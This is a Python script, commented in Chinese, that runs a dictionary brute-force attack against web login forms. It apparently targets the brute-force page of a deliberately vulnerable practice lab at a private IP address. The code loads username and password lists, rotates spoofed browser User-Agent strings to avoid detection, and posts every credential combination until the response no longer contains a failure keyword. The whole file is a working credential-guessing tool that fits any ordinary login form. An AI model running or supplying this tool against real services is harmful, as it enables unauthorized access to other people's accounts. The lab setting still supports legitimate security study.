import requests
from os.path import dirname, join
from time import sleep as time_sleep
from json import load as json_load

def match_fix(text: str, prefix: str, suffix: str) -> str:
    """匹配 reponse.text 中 prefix - suffix 中间的字符串并返回匹配结果 

    Args:
        text: 待匹配的字符串(一般为 request 请求的 response.text)  
        prefix: 匹配的前缀  
        suffix: 匹配的后缀

    Returns:
        匹配结果
    """
    return text[text.find(prefix) + len(prefix):text.find(suffix)]


def read_dict_to_list(dict_path: str) -> list:
    """读取字典文件到列表

    Args:
        dict_path: 字典文件路径(绝对路径)(可以使用 os.path.join 或者 pathlib 进行拼接)

    Returns:
        字典内容列表
    """
    with open(dict_path, "r") as f:
        # 按行读取并去除换行符
        return [line.strip() for line in f.readlines()]


def getUserAgentList(browers_json_path: str) -> list:
    """读取 browsers.json 返回 user-agent 列表  
    
    Args:
        browers_json_path: browsers.json 文件路径(绝对路径)

    Returns:
        user-agent 列表
    """
    with open(browers_json_path, 'r') as f:
        header = json_load(f)
    browsers = header['browsers']
    # 将所有键的值取出来组成一个列表
    user_agent_list = []
    for key in browsers.keys():
        for item in browsers[key]:
            user_agent_list.append(item)
    return user_agent_list


def post_request(
        socket: str, url_path: str, 
        user_gent: str,
        username: str, password: str,
        prefix: str, suffix: str
    ) -> str:
    """携带账密发送一次 post 请求获取 response, 并根据前后缀匹配出 reponse 中实际有效的部分
    (比如本例中的 username or password is not exist ~ 和 login success)    

    适用于 http 请求, 无前置校验,
    数据格式为表单数据编码(Form-Encode也即 content-type:application/x-www-form-urlencoded)形式  

    在 pyload 上如果除了 username 和 password 之外还有其他参数
    (如此函数中的 submit=Login)(一般是用于标识登录操作的), 请相应修改此函数中的 payload 项

    Args:
        socket: socket 地址, host-ip:port 的形式  
        url_path: url 路径, 为 url 中 port 后面的 /path 部分  
        user_gent: user-agent  
        username: 账号  
        password: 密码  
        prefix: 匹配的前缀
        suffix: 匹配的后缀

    Returns:
        响应结果
    """
    # 请求头
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": user_gent
    }
    # 请求地址
    url = f"http://{socket}{url_path}"
    # 请求数据
    payload = f"username={username}&password={password}&submit=Login"
    # 发送请求并返回响应结果
    reponse_text = requests.post(url, data=payload, headers=headers).text
    # 匹配出响应结果中实际有效的部分
    match_result = match_fix(reponse_text, prefix, suffix)
    return match_result


def brute_force(
        socket: str, url_path: str, 
        browers_json_path: str,
        account_dict_path: str, password_dict_path: str,
        prefix: str, suffix: str, fail_keyword: str,
        sleep_second: float
    ) -> str:
    """暴力破解

    Args:
        socket: socket 地址, host-ip:port 的形式  
        url_path: url 路径, 为 url 中 port 后面的 /path 部分   
        browers_json_path: 浏览器头信息 json 文件路径(绝对路径)  
        account_dict_path: 账号字典路径(绝对路径)  
        password_dict_path: 密码字典路径(绝对路径)  
        prefix: 匹配的前缀
        suffix: 匹配的后缀  
        fail_keyword: 失败关键字, 用于判断是否登录成功  
        sleep_second: 延时秒数, 应当为一个正的浮点数, 比如 1/0.1 对应 1s/0.1s

    Returns:
        登录成功的账号密码
    """
    # 读取字典文件到列表
    account_list = read_dict_to_list(account_dict_path)
    account_num = len(account_list)
    password_list = read_dict_to_list(password_dict_path)
    password_num = len(password_list)
    # 最大需要尝试的次数
    max_try = account_num * password_num
    # 已尝试的次数
    try_num = 0

    user_agent_list = getUserAgentList(browers_json_path)
    # user_agent_list 长度
    user_agent_num = len(user_agent_list)

    # 遍历账号密码列表
    for account in account_list:
        for password in password_list:
            # 编码 password 中的 & 符号(使用 urlencode 会将 & 符号编码为 %26)
            password = password.replace("&", "%26")
            # 以 try_num % user_agent_num 为索引取 user_agent_list 中的 user_agent
            user_agent = user_agent_list[try_num % user_agent_num]
            # 发送请求并返回响应结果
            response = post_request(
                socket=socket, url_path=url_path,
                user_gent=user_agent,
                username=account, password=password,
                prefix=prefix, suffix=suffix
            )
            # 判断是否登录成功
            if fail_keyword not in response:
                print(f'\n当前响应结果为: {response}')
                return f"login success! username: {account}, password: {password}"
            else:
                try_num += 1
                print(f"\r进度:{try_num}/{max_try}", end="")
                time_sleep(sleep_second)
    return "破解失败, 可能是字典中无相应账号密码或者操作被限制"


def main():
    # socket [hsot-ip:port] 的形式
    socket = '192.168.2.31:9221'
    # url_path
    url_path = '/vul/burteforce/bf_form.php'
    # 账号字典路径(默认为当前文件目录下的 dict/username_dict.txt)
    account_dict_path = join(dirname(__file__), "dict/username_dict.txt")
    # 密码字典路径(默认为当前文件目录下的 dict/password_dict.txt)
    password_dict_path = join(dirname(__file__), "dict/password_dict.txt")
    # 匹配的前缀
    prefix = "</form>\n        <p> "
    # 匹配的后缀
    suffix = "</p>\n\n    </div><!-- /.widget-"
    # 失败关键字, 用于判断是否登录成功
    fail_keyword = "not exist"

    browers_json_path = join(dirname(__file__), "browsers.json")

    # 暴力破解
    result = brute_force(
        socket=socket, url_path=url_path,
        browers_json_path=browers_json_path,
        account_dict_path=account_dict_path, password_dict_path=password_dict_path,
        prefix=prefix, suffix=suffix, fail_keyword=fail_keyword,
        sleep_second=0
    )
    print(result)

if __name__ == "__main__":
    main()
